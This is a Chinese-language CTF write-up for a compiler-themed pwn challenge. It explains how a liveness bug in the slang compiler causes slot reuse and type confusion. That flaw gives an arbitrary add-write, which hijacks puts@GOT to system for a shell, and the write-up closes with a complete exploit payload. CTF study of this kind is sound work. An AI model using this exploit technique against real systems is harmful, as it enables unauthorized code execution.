# slang Writeup

## 程序逻辑

题目是一个编译器方向 pwn。连接服务后提交 `slang` 源码，并用 `END_OF_SOURCE` 结束输入。

服务端会执行：

```text
slang source -> /home/ctf/slang -> generated C -> gcc -> ELF -> run
```

生成的 C 代码里，局部变量统一放在：

```c
uintptr_t slot[];
```

不同类型变量使用时再强转成 `int64_t`、`char *`、`vec_t *`。所以如果 slot 分配出错，就可能造成类型混淆。

## 漏洞点

漏洞在编译器的 `alloc_scan_stmt()`：

```c
} else if (s->kind == S_CALL) {
    Proto *p = find_proto(s->name);
    if (!(in_loop && p && p->ret == TY_VOID)) {
        for (int i = 0; i < s->nargs; i++) {
            alloc_scan_expr(ctx, s->args[i], at);
        }
    }
}
```

当函数调用位于循环中，并且返回值是 `void` 时，编译器不会扫描它的参数。

例如：

```slang
do {
  pwn(round, vec_slot);
  forged_header := forge();
} while (round < 2);
```

活跃性分析会漏掉 `pwn(round, vec_slot)` 中的 `vec_slot`，误以为它后续不再使用，于是允许 `forged_header` 复用 `vec_slot` 的 slot。

但代码生成阶段仍然会正常生成函数调用参数，因此第二轮循环中传给 `pwn()` 的 `vec_slot` 实际已经变成了 `forged_header`。

## 利用思路

构造：

```slang
vec_slot := vec_new(0);
round := 0;
keep_vec(vec_slot);

do {
  pwn(round, vec_slot);
  forged_header := forge();
  keep_marker := one() + 1234;
  round := round + 1;
} while (round < 2);
```

生成 C 后语义近似为：

```c
slot[0] = rt_vec_new(0);   // vec_slot
slot[1] = 0;               // round

do {
  F_pwn(slot[1], slot[0]);
  slot[0] = F_forge();     // forged_header 复用 slot[0]
  slot[1] = slot[1] + 1;
} while (slot[1] < 2);
```

第一轮 `round == 0`，`pwn()` 直接返回。之后 `forged_header := forge()` 覆盖 `slot[0]`。

第二轮再调用：

```slang
pwn(round, vec_slot);
```

此时 `vec_slot` 实际已经是 `forged_header` 字符串，于是 `str` 被当成 `vec` 使用。

`forge()` 返回 16 字节：

```slang
return "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f";
```

被解释成：

```c
typedef struct vec_t {
    int64_t *data;
    int64_t size;
} vec_t;
```

也就是：

```text
data = 0
size = 0x7fffffffffffffff
```

于是：

```slang
scribble(forged_vec, idx, delta);
```

等价于：

```c
*(int64_t *)(idx * 8) += delta;
```

这就得到一个任意地址加减写。

因为题目生成 ELF 时使用 `-no-pie`，所以说直接利用加减法劫持 `puts@GOT` 为 `system`。

先算一下偏移：

```text
puts@GOT = 0x404018
0x404018 / 8 = 526339
puts - system = 0x32190 = 205200
```

直接

```slang
say("resolve puts");
scribble(forged_vec, 526339, -205200);
say("/bin/sh");
```


## Payload

```slang
function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };

  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);

  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);

  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
```

发送 payload 后追加 END_OF_SOURCE 即可
